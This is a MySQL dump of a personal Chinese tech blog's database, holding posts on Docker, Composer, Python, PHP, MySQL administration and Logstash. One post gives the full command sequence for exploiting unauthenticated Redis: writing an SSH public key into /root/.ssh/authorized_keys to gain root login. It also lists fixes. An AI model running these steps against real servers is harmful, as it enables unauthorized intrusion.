-- MySQL dump 10.14  Distrib 5.5.52-MariaDB, for Linux (x86_64)
--
-- Host: 127.0.0.1    Database: kblog
-- ------------------------------------------------------
-- Server version	5.7.16

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `archives`
--

DROP TABLE IF EXISTS `archives`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `archives` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `category_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `title` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `text` text COLLATE utf8_unicode_ci NOT NULL,
  `html` text COLLATE utf8_unicode_ci NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `archives`
--

LOCK TABLES `archives` WRITE;
/*!40000 ALTER TABLE `archives` DISABLE KEYS */;
INSERT INTO `archives` VALUES (1,1,1,'CentOS6上Docker的安装与使用','####安装Docker\r\n```bash\r\nyum install epel-release\r\nyum install docker-io\r\nservice docker start\r\nchkconfig docker on\r\n```\r\n####获取镜像\r\n```bash\r\ndocker pull kaychen/centos6_lnmp\r\n```\r\n####启动镜像\r\n```bash\r\n#进入交互模式\r\ndocker run -ti kaychen/centos6_lnmp\r\n#后台运行模式并映射80端口到容器\r\ndocker run -d -p 80:80 kaychen/centos6_lnmp\r\n```\r\n####停止镜像\r\n```bash\r\n#查看所有镜像状态\r\ndocker ps -a\r\n#停止镜像\r\ndocker stop (CONTAINER_ID)\r\n#启动镜像\r\ndocker start (CONTAINER_ID)\r\n#重启镜像\r\ndocker restart (CONTAINER_ID)\r\n```\r\n####提交镜像修改\r\n```bash\r\ndocker commit (CONTAINER_ID) kaychen/centos6_lnmp\r\n```\r\n####上传镜像\r\n```bash\r\n#登录dockerHub\r\ndocker login\r\n#上传镜像\r\ndocker push kaychen/centos6_lnmp\r\n```\r\n####导出/载入镜像\r\n```bash\r\n#导出镜像到本地\r\ndocker save -o centos6_lnmp.tar kaychen/centos6_lnmp:latest\r\n#载入镜像\r\ndocker load < centos6_lnmp.tar\r\n```\r\n####导出/导入容器\r\n```bash\r\n#导出容器\r\ndocker export 61229a6262a3 > export_centos6_lnmp.tar\r\n#导入容器\r\ncat export_centos6_lnmp.tar | sudo docker import - kaychen/testimport\r\n#可以通过指定 URL 或者某个目录来导入\r\ndocker import http://example.com/exampleimage.tgz example/imagerepo\r\n```\r\n注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。\r\n####删除镜像\r\n```bash\r\n#一次性删除所有的容器\r\ndocker rm $(docker ps -q -a)\r\n#一次性删除所有的镜像\r\ndocker rmi $(docker images -q)\r\n```','<h4>安装Docker</h4>\n\n<pre><code class=\"bash\">yum install epel-release\nyum install docker-io\nservice docker start\nchkconfig docker on\n</code></pre>\n\n<h4>获取镜像</h4>\n\n<pre><code class=\"bash\">docker pull kaychen/centos6_lnmp\n</code></pre>\n\n<h4>启动镜像</h4>\n\n<pre><code class=\"bash\">#进入交互模式\ndocker run -ti kaychen/centos6_lnmp\n#后台运行模式并映射80端口到容器\ndocker run -d -p 80:80 kaychen/centos6_lnmp\n</code></pre>\n\n<h4>停止镜像</h4>\n\n<pre><code class=\"bash\">#查看所有镜像状态\ndocker ps -a\n#停止镜像\ndocker stop (CONTAINER_ID)\n#启动镜像\ndocker start (CONTAINER_ID)\n#重启镜像\ndocker restart (CONTAINER_ID)\n</code></pre>\n\n<h4>提交镜像修改</h4>\n\n<pre><code class=\"bash\">docker commit (CONTAINER_ID) kaychen/centos6_lnmp\n</code></pre>\n\n<h4>上传镜像</h4>\n\n<pre><code class=\"bash\">#登录dockerHub\ndocker login\n#上传镜像\ndocker push kaychen/centos6_lnmp\n</code></pre>\n\n<h4>导出/载入镜像</h4>\n\n<pre><code class=\"bash\">#导出镜像到本地\ndocker save -o centos6_lnmp.tar kaychen/centos6_lnmp:latest\n#载入镜像\ndocker load &lt; centos6_lnmp.tar\n</code></pre>\n\n<h4>导出/导入容器</h4>\n\n<pre><code class=\"bash\">#导出容器\ndocker export 61229a6262a3 &gt; export_centos6_lnmp.tar\n#导入容器\ncat export_centos6_lnmp.tar | sudo docker import - kaychen/testimport\n#可以通过指定 URL 或者某个目录来导入\ndocker import http://example.com/exampleimage.tgz example/imagerepo\n</code></pre>\n\n<p>注：用户既可以使用 docker load 来导入镜像存储文件到本地镜像库，也可以使用 docker import 来导入一个容器快照到本地镜像库。这两者的区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态），而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。</p>\n\n<h4>删除镜像</h4>\n\n<pre><code class=\"bash\">#一次性删除所有的容器\ndocker rm $(docker ps -q -a)\n#一次性删除所有的镜像\ndocker rmi $(docker images -q)\n</code></pre>\n',1,'2016-05-03 07:55:28','2016-11-03 20:37:36'),(2,1,1,'Composer笔记','####1.安装\r\n```bash\r\ncurl -sS https://getcomposer.org/installer | php\r\nmv composer.phar /usr/local/bin/composer\r\n```\r\n####2.修改为中国镜像\r\n1.系统全局配置：即将配置信息添加到 Composer 的全局配置文件 `config.json` 中。\r\n```bash\r\ncomposer config -g repo.packagist composer https://packagist.phpcomposer.com\r\n```\r\n\r\n2.单个项目配置： 将配置信息添加到某个项目的 `composer.json` 文件中。\r\n```bash\r\ncomposer config repo.packagist composer https://packagist.phpcomposer.com\r\n```\r\n上述命令将会在当前项目中的 composer.json 文件的末尾自动添加镜像的配置信息（你也可以自己手工添加）：\r\n```\r\n\"repositories\": {\r\n    \"packagist\": {\r\n        \"type\": \"composer\",\r\n        \"url\": \"https://packagist.phpcomposer.com\"\r\n    }\r\n}\r\n```\r\n\r\nComposer中文指南：[phpcomposer.com](http://docs.phpcomposer.com/)','<h4>1.安装</h4>\n\n<pre><code class=\"bash\">curl -sS https://getcomposer.org/installer | php\nmv composer.phar /usr/local/bin/composer\n</code></pre>\n\n<h4>2.修改为中国镜像</h4>\n\n<p>1.系统全局配置：即将配置信息添加到 Composer 的全局配置文件 <code>config.json</code> 中。</p>\n\n<pre><code class=\"bash\">composer config -g repo.packagist composer https://packagist.phpcomposer.com\n</code></pre>\n\n<p>2.单个项目配置： 将配置信息添加到某个项目的 <code>composer.json</code> 文件中。</p>\n\n<pre><code class=\"bash\">composer config repo.packagist composer https://packagist.phpcomposer.com\n</code></pre>\n\n<p>上述命令将会在当前项目中的 composer.json 文件的末尾自动添加镜像的配置信息（你也可以自己手工添加）：</p>\n\n<pre><code>\"repositories\": {\n    \"packagist\": {\n        \"type\": \"composer\",\n        \"url\": \"https://packagist.phpcomposer.com\"\n    }\n}\n</code></pre>\n\n<p>Composer中文指南：<a href=\"http://docs.phpcomposer.com/\">phpcomposer.com</a></p>\n',1,'2016-05-03 07:57:42','2016-05-03 07:57:42'),(3,1,1,'Git常用命令速查表','![Git常用命令速查表](http://kaychen.u.qiniudn.com/Git_Cheat_Sheet.png)','<p><img src=\"http://kaychen.u.qiniudn.com/Git_Cheat_Sheet.png\" alt=\"Git常用命令速查表\" /></p>\n',1,'2016-05-04 00:13:54','2016-05-05 18:39:10'),(4,1,1,'修改Ubuntu Terminal激活标签颜色','使用Ubuntu一直苦于Terminal当前标签颜色与其他标签颜色差距太小，根本区分不了自己在哪个标签下面，于是从网上找来修改Terminal激活标签颜色的方法。\r\n\r\n####1.打开gtk-widgets.css:\r\n```bash\r\nsudo vim /usr/share/themes/Ambiance/gtk-3.0/gtk-widgets.css \r\n```\r\n\r\n####2.找到.notebook tab:active样式:\r\n```css\r\n.notebook tab:active {\r\n    background-color: @bg_color; \r\n}\r\n```\r\n\r\n####3.修改为你需要的显示的颜色：\r\n```css\r\n.notebook tab:active {\r\n    background-color: white;\r\n}\r\n```\r\n\r\n####4.重新打开Terminal即可\r\n![修改Ubuntu Terminal激活标签颜色](http://kaychen.u.qiniudn.com/terminal_tab_active_color.png)','<p>使用Ubuntu一直苦于Terminal当前标签颜色与其他标签颜色差距太小，根本区分不了自己在哪个标签下面，于是从网上找来修改Terminal激活标签颜色的方法。</p>\n\n<h4>1.打开gtk-widgets.css:</h4>\n\n<pre><code class=\"bash\">sudo vim /usr/share/themes/Ambiance/gtk-3.0/gtk-widgets.css \n</code></pre>\n\n<h4>2.找到.notebook tab:active样式:</h4>\n\n<pre><code class=\"css\">.notebook tab:active {\n    background-color: @bg_color; \n}\n</code></pre>\n\n<h4>3.修改为你需要的显示的颜色：</h4>\n\n<pre><code class=\"css\">.notebook tab:active {\n    background-color: white;\n}\n</code></pre>\n\n<h4>4.重新打开Terminal即可</h4>\n\n<p><img src=\"http://kaychen.u.qiniudn.com/terminal_tab_active_color.png\" alt=\"修改Ubuntu Terminal激活标签颜色\" /></p>\n',1,'2016-05-10 07:25:33','2016-05-10 07:42:09'),(5,1,1,'Python的列表推导式','#### 1.列表推导式书写形式\r\n[表达式 for 变量 in 列表]    或者  [表达式 for 变量 in 列表 if 条件]\r\n\r\n#### 2.举例说明\r\n```python\r\n#!/usr/bin/python\r\n# -*- coding: utf-8 -*-\r\n\r\nli = [1,2,3,4,5,6,7,8,9]\r\nprint [x**2 for x in li]\r\nprint [x**2 for x in li if x>5]\r\nprint dict([(x,x*10) for x in li])\r\nprint  [ (x, y) for x in range(10) if x % 2 if x > 3 for y in range(10) if y > 7 if y != 8 ]\r\nvec=[2,4,6]\r\nvec2=[4,3,-9]\r\nsq = [vec[i]+vec2[i] for i in range(len(vec))]\r\nprint sq\r\nprint [x*y for x in [1,2,3] for y in  [1,2,3]]\r\ntestList = [1,2,3,4]\r\ndef mul2(x):\r\n    return x*2\r\nprint [mul2(i) for i in testList]\r\n```\r\n####3.结果\r\n[1, 4, 9, 16, 25, 36, 49, 64, 81]\r\n\r\n[36, 49, 64, 81]\r\n\r\n{1: 10, 2: 20, 3: 30, 4: 40, 5: 50, 6: 60, 7: 70, 8: 80, 9: 90}\r\n\r\n[(5, 9), (7, 9), (9, 9)]\r\n\r\n[6, 7, -3]\r\n\r\n[1, 2, 3, 2, 4, 6, 3, 6, 9]\r\n\r\n[2, 4, 6, 8]','<h4>1.列表推导式书写形式</h4>\n\n<p>[表达式 for 变量 in 列表]    或者  [表达式 for 变量 in 列表 if 条件]</p>\n\n<h4>2.举例说明</h4>\n\n<pre><code class=\"python\">#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nli = [1,2,3,4,5,6,7,8,9]\nprint [x**2 for x in li]\nprint [x**2 for x in li if x&gt;5]\nprint dict([(x,x*10) for x in li])\nprint  [ (x, y) for x in range(10) if x % 2 if x &gt; 3 for y in range(10) if y &gt; 7 if y != 8 ]\nvec=[2,4,6]\nvec2=[4,3,-9]\nsq = [vec[i]+vec2[i] for i in range(len(vec))]\nprint sq\nprint [x*y for x in [1,2,3] for y in  [1,2,3]]\ntestList = [1,2,3,4]\ndef mul2(x):\n    return x*2\nprint [mul2(i) for i in testList]\n</code></pre>\n\n<h4>3.结果</h4>\n\n<p>[1, 4, 9, 16, 25, 36, 49, 64, 81]</p>\n\n<p>[36, 49, 64, 81]</p>\n\n<p>{1: 10, 2: 20, 3: 30, 4: 40, 5: 50, 6: 60, 7: 70, 8: 80, 9: 90}</p>\n\n<p>[(5, 9), (7, 9), (9, 9)]</p>\n\n<p>[6, 7, -3]</p>\n\n<p>[1, 2, 3, 2, 4, 6, 3, 6, 9]</p>\n\n<p>[2, 4, 6, 8]</p>\n',1,'2016-05-16 01:40:09','2016-05-16 01:42:37'),(6,1,1,'PHP POST提交数据','####1.封装curl方法:\r\n```php\r\nfunction curl($url,$post_data){\r\n		$curl = curl_init(); \r\n		curl_setopt($curl, CURLOPT_URL, $url); \r\n		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); \r\n		curl_setopt($curl, CURLOPT_POST, 1);//post提交方式\r\n		curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);\r\n		$data = curl_exec($curl);\r\n		return $data;\r\n}\r\n```\r\n####2.使用方法:\r\n```php\r\n$url = \'http://www.kaychen.cn/test\';\r\n$post_data = array(\r\n		\'timestamp\'=>time(),\r\n		\'signature\'=>$signature,\r\n		\'user_id\'=>1,\r\n);\r\n$data = curl($url,$post_data);\r\n```','<h4>1.封装curl方法:</h4>\n\n<pre><code class=\"php\">function curl($url,$post_data){\n        $curl = curl_init(); \n        curl_setopt($curl, CURLOPT_URL, $url); \n        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); \n        curl_setopt($curl, CURLOPT_POST, 1);//post提交方式\n        curl_setopt($curl, CURLOPT_POSTFIELDS, $post_data);\n        $data = curl_exec($curl);\n        return $data;\n}\n</code></pre>\n\n<h4>2.使用方法:</h4>\n\n<pre><code class=\"php\">$url = \'http://www.kaychen.cn/test\';\n$post_data = array(\n        \'timestamp\'=&gt;time(),\n        \'signature\'=&gt;$signature,\n        \'user_id\'=&gt;1,\n);\n$data = curl($url,$post_data);\n</code></pre>\n',1,'2016-05-30 05:48:17','2016-05-30 05:49:13'),(7,1,1,'Mysql笔记','####一、Mysql修改密码\r\n######知道原密码\r\n```sql\r\nmysqladmin -u用户名 -p原密码 password 新密码\r\n```\r\n######不知道原密码\r\n关闭数据库并以跳过授权表方式启动\r\n```bash\r\nmysqld_safe --skip-grant-tables &\r\n```\r\n启动之后进入数据库执行更新SQL\r\n```sql\r\nUPDATE mysql.user SET password=PASSWORD(\'新密码\') WHERE User=\'root\';\r\n```\r\n\r\n####二、Mysql授权\r\n######1.远程授权\r\n```sql\r\ngrant all on *.* to root@\'%\'identified by \'password\';\r\n```\r\n######2.查看授权\r\n```sql\r\nshow grants form root@\'10.1.10.%\'\r\n```\r\n######3.删除授权\r\n```sql\r\nrevoke all on *.* from root@\'%\'; \r\n```\r\n######4.刷新授权\r\n```sql\r\nflush privileges; \r\n```\r\n######5.查看账号\r\n```sql\r\nselect Db,Host from mysql.db; \r\n```\r\n######6.查看当前账号\r\n```sql\r\nselect user();\r\n```\r\n######7.根据条件删除账号\r\n```sql\r\ndelete from mysql.db where Host=\"10.1.0.%\";\r\ndelete from mysql.db where Db=\"dx7db_game01\";\r\n```\r\n\r\n####三、Mysql日志\r\n######1.查看binlog列表\r\n```sql\r\nshow master logs;\r\n```\r\n######2.按名称来删除binlog\r\n```sql\r\npurge master logs to \'mysql-bin.001970\';\r\n```\r\n######3.按时间来删除binlog\r\n```sql\r\npurge master logs before \'2016-07-01 17:36:55\';\r\n```','<h4>一、Mysql修改密码</h4>\n\n<h6>知道原密码</h6>\n\n<pre><code class=\"sql\">mysqladmin -u用户名 -p原密码 password 新密码\n</code></pre>\n\n<h6>不知道原密码</h6>\n\n<p>关闭数据库并以跳过授权表方式启动</p>\n\n<pre><code class=\"bash\">mysqld_safe --skip-grant-tables &amp;\n</code></pre>\n\n<p>启动之后进入数据库执行更新SQL</p>\n\n<pre><code class=\"sql\">UPDATE mysql.user SET password=PASSWORD(\'新密码\') WHERE User=\'root\';\n</code></pre>\n\n<h4>二、Mysql授权</h4>\n\n<h6>1.远程授权</h6>\n\n<pre><code class=\"sql\">grant all on *.* to root@\'%\'identified by \'password\';\n</code></pre>\n\n<h6>2.查看授权</h6>\n\n<pre><code class=\"sql\">show grants form root@\'10.1.10.%\'\n</code></pre>\n\n<h6>3.删除授权</h6>\n\n<pre><code class=\"sql\">revoke all on *.* from root@\'%\'; \n</code></pre>\n\n<h6>4.刷新授权</h6>\n\n<pre><code class=\"sql\">flush privileges; \n</code></pre>\n\n<h6>5.查看账号</h6>\n\n<pre><code class=\"sql\">select Db,Host from mysql.db; \n</code></pre>\n\n<h6>6.查看当前账号</h6>\n\n<pre><code class=\"sql\">select user();\n</code></pre>\n\n<h6>7.根据条件删除账号</h6>\n\n<pre><code class=\"sql\">delete from mysql.db where Host=\"10.1.0.%\";\ndelete from mysql.db where Db=\"dx7db_game01\";\n</code></pre>\n\n<h4>三、Mysql日志</h4>\n\n<h6>1.查看binlog列表</h6>\n\n<pre><code class=\"sql\">show master logs;\n</code></pre>\n\n<h6>2.按名称来删除binlog</h6>\n\n<pre><code class=\"sql\">purge master logs to \'mysql-bin.001970\';\n</code></pre>\n\n<h6>3.按时间来删除binlog</h6>\n\n<pre><code class=\"sql\">purge master logs before \'2016-07-01 17:36:55\';\n</code></pre>\n',1,'2016-07-04 22:31:34','2016-07-04 22:31:34'),(8,1,1,'利用Logstash实时分析日志','Logstash是一个应用程序日志、事件的传输、处理、管理和搜索的平台。你可以用它来统一对应用程序日志进行收集管理，提供 Web 接口用于查询和统计。\r\n\r\n## 一、安装\r\n环境:Centos6\r\n\r\n需要java运行环境:`java -version`\r\n\r\n下载并安装公共签名密钥\r\n```bash\r\nrpm --import https://packages.elastic.co/GPG-KEY-elasticsearch\r\n```\r\n然后在/etc/yum.repos.d/目录添加一个以`.repo`后缀的文件，比如:`logstash.repo`\r\n\r\n```\r\n[logstash-2.3]\r\nname=Logstash repository for 2.3.x packages\r\nbaseurl=https://packages.elastic.co/logstash/2.3/centos\r\ngpgcheck=1\r\ngpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch\r\nenabled=1\r\n```\r\n至此资源库添加完成，你可以使用yum安装logstash了\r\n```bash\r\nyum install logstash\r\n```\r\n安装完成后，可用以下命令测试是否安装成功\r\n```bash\r\nbin/logstash -e \'input { stdin { } } output { stdout {} }\'\r\n```\r\nlogstash的默认程序路径在:`/opt/logstash/`\r\n\r\nlogstash的默认配置文件路径在:`/etc/logstash/conf.d/`\r\n\r\n## 二、配置\r\n在`/etc/logstash/conf.d/`新建一个以`.conf`后缀的文件，比如:`nginx.conf`\r\n```\r\ninput {\r\n	file {\r\n		path => \"/opt/log/pv.ifchange.com/pv.ifchange.com.access.log\"\r\n		type => \"nginx-access\"\r\n	}\r\n}\r\noutput {\r\n	http {\r\n		format => \"form\"\r\n		http_method => \"post\"\r\n		url => \"http://logsystem.dev.ifchange.com/analysislog/clickLog\"\r\n		mapping => [\"Body\", \'%{message}\']\r\n	}\r\n	stdout {\r\n		codec => \"rubydebug\"\r\n	}\r\n}\r\n```\r\n以上配置代表将文件`/opt/log/pv.ifchange.com/pv.ifchange.com.access.log`里的日志实时通过HTTP POST的方式提交给`http://logsystem.dev.ifchange.com/analysislog/clickLog`进行处理。为了方便调试，加了stdout参数，代表输出到屏幕。\r\n\r\n##三、启动\r\n为了方便调试可手动启动:\r\n```bash\r\n/opt/logstash/bin/logstash agent -f /etc/logstash/conf.d/test.conf\r\n```\r\n也可直接使用服务启动:\r\n```bash\r\nservice logstash start\r\n```\r\n停止服务:\r\n```bash\r\nservice logstash stop\r\n```\r\n配置文件测试:\r\n```bash\r\nservice logstash configtest\r\n```','<p>Logstash是一个应用程序日志、事件的传输、处理、管理和搜索的平台。你可以用它来统一对应用程序日志进行收集管理，提供 Web 接口用于查询和统计。</p>\n\n<h2>一、安装</h2>\n\n<p>环境:Centos6</p>\n\n<p>需要java运行环境:<code>java -version</code></p>\n\n<p>下载并安装公共签名密钥</p>\n\n<pre><code class=\"bash\">rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch\n</code></pre>\n\n<p>然后在/etc/yum.repos.d/目录添加一个以<code>.repo</code>后缀的文件，比如:<code>logstash.repo</code></p>\n\n<pre><code>[logstash-2.3]\nname=Logstash repository for 2.3.x packages\nbaseurl=https://packages.elastic.co/logstash/2.3/centos\ngpgcheck=1\ngpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch\nenabled=1\n</code></pre>\n\n<p>至此资源库添加完成，你可以使用yum安装logstash了</p>\n\n<pre><code class=\"bash\">yum install logstash\n</code></pre>\n\n<p>安装完成后，可用以下命令测试是否安装成功</p>\n\n<pre><code class=\"bash\">bin/logstash -e \'input { stdin { } } output { stdout {} }\'\n</code></pre>\n\n<p>logstash的默认程序路径在:<code>/opt/logstash/</code></p>\n\n<p>logstash的默认配置文件路径在:<code>/etc/logstash/conf.d/</code></p>\n\n<h2>二、配置</h2>\n\n<p>在<code>/etc/logstash/conf.d/</code>新建一个以<code>.conf</code>后缀的文件，比如:<code>nginx.conf</code></p>\n\n<pre><code>input {\n    file {\n        path =&gt; \"/opt/log/pv.ifchange.com/pv.ifchange.com.access.log\"\n        type =&gt; \"nginx-access\"\n    }\n}\noutput {\n    http {\n        format =&gt; \"form\"\n        http_method =&gt; \"post\"\n        url =&gt; \"http://logsystem.dev.ifchange.com/analysislog/clickLog\"\n        mapping =&gt; [\"Body\", \'%{message}\']\n    }\n    stdout {\n        codec =&gt; \"rubydebug\"\n    }\n}\n</code></pre>\n\n<p>以上配置代表将文件<code>/opt/log/pv.ifchange.com/pv.ifchange.com.access.log</code>里的日志实时通过HTTP POST的方式提交给<code>http://logsystem.dev.ifchange.com/analysislog/clickLog</code>进行处理。为了方便调试，加了stdout参数，代表输出到屏幕。</p>\n\n<h2>三、启动</h2>\n\n<p>为了方便调试可手动启动:</p>\n\n<pre><code class=\"bash\">/opt/logstash/bin/logstash agent -f /etc/logstash/conf.d/test.conf\n</code></pre>\n\n<p>也可直接使用服务启动:</p>\n\n<pre><code class=\"bash\">service logstash start\n</code></pre>\n\n<p>停止服务:</p>\n\n<pre><code class=\"bash\">service logstash stop\n</code></pre>\n\n<p>配置文件测试:</p>\n\n<pre><code class=\"bash\">service logstash configtest\n</code></pre>\n',1,'2016-07-13 06:02:41','2016-07-13 06:13:06'),(9,2,1,'天目湖-20160723','![](http://kaychen.u.qiniudn.com/tianmuhu001.jpg)','<p><img src=\"http://kaychen.u.qiniudn.com/tianmuhu001.jpg\" alt=\"\" /></p>\n',1,'2016-07-28 22:24:50','2016-07-28 22:24:50'),(10,1,1,'利用Redis未授权访问配合SSHkey文件提权','##一.漏洞概述\r\nRedis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。\r\n\r\n##二.漏洞分析与利用\r\n####1.先创建秘钥文件\r\n```bash\r\nssh-keygen –t rsa\r\n```\r\n####2.利用空口令登录redis\r\n```bash\r\nredis-cli -h xxx.xxx.xxx.xxx\r\n\r\nconfig set dir /root/.ssh\r\nconfig get dir\r\nconfig set dbfilename authorized_keys\r\nset test \"\\n\\n\\nssh-rsa  key_pub\\n\\n\\n\\n\"\r\nsave\r\n```\r\n其中key_pub为生成的公钥,即可将公钥保存在远端服务器,使得登录时不需要输入账号与密码.\r\n\r\n####3. 利用私钥登录root@xxx.xxx.xxx.xxx\r\n```bash\r\nssh -i id_rsa root@xxx.xxx.xxx.xxx\r\n```\r\n\r\n##三.漏洞修补方法\r\n1. 禁止使用 root 权限启动 redis 服务；\r\n2. 对 redis 访问启用密码认证，并且添加 IP 访问限制；\r\n3. 尽可能不对公网直接开放 SSH 服务。\r\n\r\n##四.参考\r\n- [zoomeye](https://www.zoomeye.org/)\r\n- [Redis 未授权访问配合 SSH key 文件利用分析](http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/)\r\n- [Redis未授权访问导致可远程获得服务器权限](http://www.2cto.com/Article/201511/449779.html)','<h2>一.漏洞概述</h2>\n\n<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>\n\n<h2>二.漏洞分析与利用</h2>\n\n<h4>1.先创建秘钥文件</h4>\n\n<pre><code class=\"bash\">ssh-keygen –t rsa\n</code></pre>\n\n<h4>2.利用空口令登录redis</h4>\n\n<pre><code class=\"bash\">redis-cli -h xxx.xxx.xxx.xxx\n\nconfig set dir /root/.ssh\nconfig get dir\nconfig set dbfilename authorized_keys\nset test \"\\n\\n\\nssh-rsa  key_pub\\n\\n\\n\\n\"\nsave\n</code></pre>\n\n<p>其中key_pub为生成的公钥,即可将公钥保存在远端服务器,使得登录时不需要输入账号与密码.</p>\n\n<h4>3. 利用私钥登录root@xxx.xxx.xxx.xxx</h4>\n\n<pre><code class=\"bash\">ssh -i id_rsa root@xxx.xxx.xxx.xxx\n</code></pre>\n\n<h2>三.漏洞修补方法</h2>\n\n<ol>\n<li>禁止使用 root 权限启动 redis 服务；</li>\n<li>对 redis 访问启用密码认证，并且添加 IP 访问限制；</li>\n<li>尽可能不对公网直接开放 SSH 服务。</li>\n</ol>\n\n<h2>四.参考</h2>\n\n<ul>\n<li><a href=\"https://www.zoomeye.org/\">zoomeye</a></li>\n<li><a href=\"http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/\">Redis 未授权访问配合 SSH key 文件利用分析</a></li>\n<li><a href=\"http://www.2cto.com/Article/201511/449779.html\">Redis未授权访问导致可远程获得服务器权限</a></li>\n</ul>\n',1,'2016-08-23 09:12:55','2016-08-24 06:31:16');
/*!40000 ALTER TABLE `archives` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `categorys`
--

DROP TABLE IF EXISTS `categorys`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `categorys` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `category_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '1',
  `sort` tinyint(4) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `categorys`
--

LOCK TABLES `categorys` WRITE;
/*!40000 ALTER TABLE `categorys` DISABLE KEYS */;
INSERT INTO `categorys` VALUES (1,'默认分类',1,0,'2016-05-03 07:54:35','2016-05-03 07:54:35'),(2,'摄影',1,0,'2016-07-28 22:19:02','2016-07-28 22:19:02');
/*!40000 ALTER TABLE `categorys` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `migrations`
--

DROP TABLE IF EXISTS `migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `migrations` (
  `migration` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `migrations`
--

LOCK TABLES `migrations` WRITE;
/*!40000 ALTER TABLE `migrations` DISABLE KEYS */;
INSERT INTO `migrations` VALUES ('2014_10_12_000000_create_users_table',1),('2014_10_12_100000_create_password_resets_table',1),('2016_04_27_140753_create_archives_tables',1),('2016_04_27_145231_create_categorys_table',1);
/*!40000 ALTER TABLE `migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_resets`
--

DROP TABLE IF EXISTS `password_resets`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `password_resets` (
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  KEY `password_resets_email_index` (`email`),
  KEY `password_resets_token_index` (`token`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_resets`
--

LOCK TABLES `password_resets` WRITE;
/*!40000 ALTER TABLE `password_resets` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_resets` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
